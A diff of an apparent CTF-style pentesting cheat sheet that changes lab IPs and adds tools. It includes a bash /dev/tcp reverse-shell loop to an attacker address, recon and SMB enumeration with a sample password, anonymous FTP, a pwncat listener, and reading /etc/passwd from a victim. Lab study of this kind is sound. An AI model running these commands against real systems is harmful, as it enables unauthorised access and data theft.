@@ -38,27 +38,29 @@ and your IP changes just before the game starts, and no script have the correct 
 
 <b>Closed ports give you back a "Connection refused"</b>
 
-<b>hacked-account@victim~: <code>for i in 79 80 81; do echo $i & bash -i >& /dev/tcp/10.10.20.30/$i 0>&1;done</code>
+<b>hacked-account@victim~: <code>for i in 79 80 81; do echo $i & bash -i >& /dev/tcp/10.10.20.20/$i 0>&1;done</code>
 
 <br><br>
 
 <h2>RECON</h2> 
 
-<b>pform@attacker~: </b><code>rustscan -A 10.10.10.10</code>
+<b>pform@attacker~: </b><code>rustscan -A 10.10.20.20</code>
 
-<b>pform@attacker~: </b><code>sudo nmap -Pn -sV -sC -oN nmap.log 10.10.10.10</code>
+<b>pform@attacker~: </b><code>sudo nmap -Pn -sV -sC -oN nmap.log 10.10.20.20</code>
 
-<b>pform@attacker~: </b><code>gobuster -dir -e php,html,htm,txt,log,conf,flag -u http://10.10.10.10 -w /usr/share/wordlists/directory-list-2.3-medium.txt</code>
+<b>pform@attacker~: </b><code>gobuster -dir -e php,html,htm,txt,log,conf,flag -u http://10.10.20.20 -w /usr/share/wordlists/directory-list-2.3-medium.txt</code>
 
-<b>pform@attacker~: </b><code>nikto -Display 1234EP -o report.html -Format htm -Tuning 123bde -host 10.10.10.10</code>
+<b>pform@attacker~: </b><code>wfuzz -w /usr/share/wordlists/directory-list-2.3-medium.txt -c --hc 404 http://10.10.20.20/FUZZ</code>
+
+<b>pform@attacker~: </b><code>nikto -Display 1234EP -o report.html -Format htm -Tuning 123bde -host 10.10.20.20</code>
 
 <h2>SMB</h2>
 
-<b>pform@attacker~: </b><code>smbmap -H 10.10.10.10</code>
+<b>pform@attacker~: </b><code>smbmap -H 10.10.20.20</code>
 
-<b>pform@attacker~: </b><code>smbclient -L \\\\10.10.10.10</code>
+<b>pform@attacker~: </b><code>smbclient -L \\\\10.10.20.20</code>
 
-<b>pform@attacker~: </b><code>smbclient -L \\\\10.10.10.10\\C$ -U guest -W WORKGROUP</code>
+<b>pform@attacker~: </b><code>smbclient -L \\\\10.10.20.20\\C$ -U guest -W WORKGROUP</code>
 
 <b>Download :</b> get
 
@@ -66,12 +68,12 @@ and your IP changes just before the game starts, and no script have the correct 
 
 <h2>Mount smb share</h2>
 
-<code>smbmount "\\\\10.10.10.10\\super-secret-folder" -U hacked-account -c 'mount /mnt/super-secret-folder/ -u 500 -g 100'</code>
+<code>smbmount "\\\\10.10.20.20\\super-secret-folder" -U hacked-account -c 'mount /mnt/super-secret-folder/ -u 500 -g 100'</code>
 
 <h2>Map out smb shares</h2>
 
-smbmap -H 10.10.10.10
-smbmap -u hacked-account -p supersecretpassword123 -d workgroup -H 10.10.10.10
+smbmap -H 10.10.20.20
+smbmap -u hacked-account -p supersecretpassword123 -d workgroup -H 10.10.20.20
 
 
 
@@ -79,7 +81,7 @@ smbmap -u hacked-account -p supersecretpassword123 -d workgroup -H 10.10.10.10
 
 Is the host vuln to anonymous login?
 
-<b>pform@attacker~: </b><code>ftp 10.10.10.10</code>
+<b>pform@attacker~: </b><code>ftp 10.10.20.20</code>
 
 <b>pform@attacker~: </b>Login: <code>anonymous</code> Password: <code>anonymous</code>
 
@@ -113,9 +115,9 @@ I think remmina is slow, compared to xfreerdp.
 
 <h2>SSH</h2>
 
-<b>pform@attacker~: </b><code>ssh user@10.10.10.10 -p 22</code>
+<b>pform@attacker~: </b><code>ssh user@10.10.20.20 -p 22</code>
 
-<b>pform@attacker~: </b><code>ssh -i id_rsa user@10.10.10.10 -p 22</code>
+<b>pform@attacker~: </b><code>ssh -i id_rsa user@10.10.20.20 -p 22</code>
 
 
 <h1>Listners</1>
@@ -126,14 +128,16 @@ I think remmina is slow, compared to xfreerdp.
 
 <h2>PWNCAT</h2>
 
+For more mer info on pwncat visit: <li>https://github.com/calebstewart/pwncat</li>
+
 <code>git clone https://github.com/calebstewart/pwncat.git; cd pwncat</code>
 
 <code>pwncat -l -p 5555</code>
 
-For more mer info on pwncat visit: <li>https://github.com/calebstewart/pwncat</li>
-
   
 I prefer pwncat as you can just press<b>"CTRL+D"</b> and download and upload files like this:
+
+<b>pform@remote~: </b><code>download /etc/passwd</code>
 
 <b>pform@local~: </b><code>download /etc/passwd</code>
 
